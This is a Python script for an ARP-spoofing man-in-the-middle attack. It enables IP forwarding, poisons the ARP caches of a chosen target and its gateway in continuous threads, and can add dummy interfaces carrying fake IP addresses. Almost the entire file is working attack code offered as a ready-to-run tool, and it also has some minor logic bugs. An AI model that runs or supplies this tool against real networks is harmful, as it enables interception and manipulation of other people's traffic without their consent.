import time
import os
import sys
import spoofer
import _thread
import socket

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distros
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def thread_spoof(target1, target2, target_mac):
    while True:
        spoofer.spoof(target1, target2, target_mac)
        time.sleep(1)


def validIPAddress(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def argParser():

    i = 2
    t = True
    f = True
    gw = ""
    fake = []
    targets = []
    tmp = []
    k = 1

    while k < len(sys.argv):
        tmp.append(sys.argv[k])
        k = k + 1

    j = len(tmp)

    for x in tmp:
        if x == "-h":
            print("Script needs to be run as root")
            print("Specify target to arpspoof with -t (required) - e.g -t 192.168.1.2")
            print("Specify IP addresses to masquerade as with -f (optional) - e.g -f 1.1.1.1 1.1.1.2")
            print("Specify default gateway -g (if not provided the script will guess) - e.g -g 192.168.1.1")
            print("----------------------------------")
            exit()
        elif x == "-t":
            t = False
            if sys.argv[i]:
                if validIPAddress(sys.argv[i]):
                    target = sys.argv[i]
                else:
                    print(sys.argv[i] + " is not an valid ip address")
                    exit()
            else:
                print("Missing value for -t")
                exit()
        elif x == "-f":
            p = i
            f = False
            while (tmp[p] != "-g") and (tmp[p] != "-t"):
                if validIPAddress(sys.argv[p]):
                    fake.append(sys.argv[p])
                else:
                    print(sys.argv[p] + " is not an valid ip address")
                p = p + 1
                if p == j:
                    break
            if sys.argv[p]:
                if validIPAddress(sys.argv[p]):
                    fake.append(sys.argv[p])
            else:
                print(sys.argv[p] + " is not an valid ip address")
        elif x == "-g":
            if validIPAddress(sys.argv[i]):
                gw = sys.argv[i]
            else:
                print(sys.argv[i] + " is not an valid ip address")

        i = i + 1

    if t:
        print("No target specified please provide target with -t")
        print("----------------------------------")
        exit()

    if f:
        print("No ip addresses to masquerade as specified will just arpspoof target")
        print("")

    if gw == "":
        tmp = target.split('.')
        gw = (tmp[0] + "." + tmp[1] + "." + tmp[2] + ".1")
        print("Assuming default gateway is: " + gw)
        print("If this is not correct please supply the ip for the default gateway as an argument with -g")
        print("")

    targets.append(target)
    targets.append(gw)
    targets.append(fake)

    print("Arguments loaded")
    print("Target: " + targets[0])
    print("Default Gateway: " + targets[1])
    if not f:
        print("Fake ips ", targets[2])

    return targets


def main():
    print("----------------------------------")
    targets = argParser()
    print("----------------------------------")
    print("Enabling ip_forward")
    print("----------------------------------")
    _enable_linux_iproute()
    print("Getting mac address for " + targets[0])
    target_mac = spoofer.get_mac(targets[0])
    print("Success " + target_mac)
    print("Getting mac address for " + targets[1])
    gw_mac = spoofer.get_mac(targets[1])
    print("Success " + gw_mac)
    print("----------------------------------")

    if targets[2]:
        i = 0
        print("Creating Virtual NIC eth10 with ips: ", targets[2])
        bash = "modprobe dummy && ip link add dummy type dummy"
        os.system(bash)
        for x in targets[2]:
            bash = "ip addr add " + x + "/0 dev dummy label dummy:" + str(i)
            os.system(bash)
            i = i + 1
        bash = "ip a | grep -w inet"
        os.system(bash)
        print("Dummy NICs created")
        print("----------------------------------")


    print("Starting ARP spoofer thread...")

    _thread.start_new_thread(thread_spoof, (targets[0], targets[1], target_mac))
    _thread.start_new_thread(thread_spoof, (targets[1], targets[0], gw_mac))

    print("Success!")
    print("----------------------------------")

    try:
        while True:
            #WIP
            pass
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        if targets[2]:
            bash = "ip link delete dummy type dummy"
            os.system(bash)
        spoofer.restore(targets[0], targets[1], target_mac, gw_mac)
        spoofer.restore(targets[1], targets[0], target_mac, gw_mac)
        print("Done")
        print("----------------------------------")
        exit()


if __name__ == '__main__':
    if "nt" in os.name:
        exit()
    else:
        main()
